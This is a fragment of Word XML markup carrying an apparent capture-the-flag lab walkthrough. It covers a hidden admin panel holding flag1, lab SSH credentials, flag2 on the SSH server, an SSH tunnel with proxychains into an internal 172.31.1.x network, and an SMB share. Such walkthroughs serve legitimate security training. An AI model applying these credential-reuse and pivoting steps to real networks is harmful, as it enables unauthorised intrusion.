          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Hid</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>en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ge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/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min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/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ol_pa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el.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hp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f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la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g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1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ue</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1685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We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si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e </w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>sers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: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,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3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,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nn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</w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1685"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>SS</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040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ogin: m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 /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le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mein</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1685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SS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H </w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>rv</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>er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 /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om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/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oo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on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oo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’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pe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l </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-4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nking 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</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1685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/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me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/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mo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/bank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ng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/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la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g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ge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_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x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s.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mp </w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ns</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>g2 a</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>cl</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1685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We c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 u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e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oo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’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cr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ials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o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et up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n </w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">H </w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>nel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 wi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ox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y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ins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o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us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e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CP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o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cc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ss</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:spacing w:before="24"/>
        <w:ind w:left="1685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pict>
          <v:group id="_x0000_s1098" style="position:absolute;left:0;text-align:left;margin-left:76.7pt;margin-top:209.95pt;width:457.25pt;height:504.7pt;z-index:-1889;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" coordorigin="1534,4199" coordsize="9145,10094">
            <v:shape id="_x0000_s1099" style="position:absolute;left:1534;top:4199;width:9145;height:10094" coordorigin="1534,4199" coordsize="9145,10094" path="m1534,14293r9145,l10679,4199r-9145,l1534,14293xe" filled="f">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page" anchory="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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he inter</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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 w:rsidR="00A76861"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l </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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 w:rsidR="00A76861"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 w:rsidR="00A76861"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get</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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net</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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w</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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r</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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k</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1685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he 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nte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netwo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k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he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ollowing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v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 IP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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1961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172.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3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1.1.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1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0, 17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2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.31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.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1.11, </w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>2.31</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1.12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,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172.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3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1.1.4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1685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oo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n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cc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he </w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b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\\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1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7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2.31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.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1.12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\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x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ys</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1685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\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x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ys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ol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owing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 w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>iles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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2045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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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01-05-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2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5.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y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ci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o</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="35"/>
        <w:ind w:left="2045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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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\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ientX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\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-4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ientX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_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246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0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1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.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="37"/>
        <w:ind w:left="2045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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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\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ientX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\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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me.txt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1685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01-05-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2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5.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y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ci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o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he </w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>UE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lus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br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umb</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
